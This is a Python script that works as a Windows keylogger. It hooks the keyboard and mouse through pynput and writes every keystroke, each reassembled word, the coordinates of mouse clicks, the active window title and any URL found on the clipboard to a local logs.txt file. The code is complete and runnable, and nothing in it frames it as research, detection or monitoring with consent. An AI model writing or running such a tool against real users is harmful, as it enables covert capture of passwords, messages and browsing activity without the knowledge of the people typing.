import time
from pynput import keyboard, mouse
import pygetwindow as gw
import win32clipboard
import re

word_buffer = []

def get_active_window_info():
    try:
        active_window = gw.getActiveWindow()
        return active_window.title if active_window else "Unknown"
    except Exception:
        return "Unknown"

def get_clipboard_url():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        if re.match(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', data):
            return data
        return None
    except Exception:
        return None

def on_press(key):
    try:
        key_str = str(key).replace("'", "")
        if key == keyboard.Key.space or key == keyboard.Key.enter:
            word = ''.join(word_buffer).strip()
            if word:
                with open("logs.txt", "a", encoding="utf-8") as f:
                    f.write(f"[Word] '{word}' at {time.ctime()} (Window: {get_active_window_info()})\n")
            word_buffer.clear()
        elif key == keyboard.Key.backspace:
            if word_buffer:
                word_buffer.pop()  
        elif hasattr(key, 'char') and key.char:
            word_buffer.append(key.char)  
        with open("logs.txt", "a", encoding="utf-8") as f:
            f.write(f"[Key] {key_str} at {time.ctime()} (Window: {get_active_window_info()})\n")
    except Exception as e:
        with open("logs.txt", "a", encoding="utf-8") as f:
            f.write(f"[Error] Key logging failed: {str(e)} at {time.ctime()}\n")

def on_click(x, y, button, pressed):
    if pressed:
        window_info = get_active_window_info()
        clipboard_url = get_clipboard_url()
        try:
            with open("logs.txt", "a", encoding="utf-8") as f:
                f.write(f"[Mouse] Clicked at ({x}, {y}) with {button} at {time.ctime()} (Window: {window_info})")
                if clipboard_url:
                    f.write(f" [Possible URL: {clipboard_url}]")
                f.write("\n")
        except Exception as e:
            with open("logs.txt", "a", encoding="utf-8") as f:
                f.write(f"[Error] Mouse logging failed: {str(e)} at {time.ctime()}\n")

def main():
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    
    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()
    
    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        keyboard_listener.stop()
        mouse_listener.stop()

if __name__ == "__main__":
    main()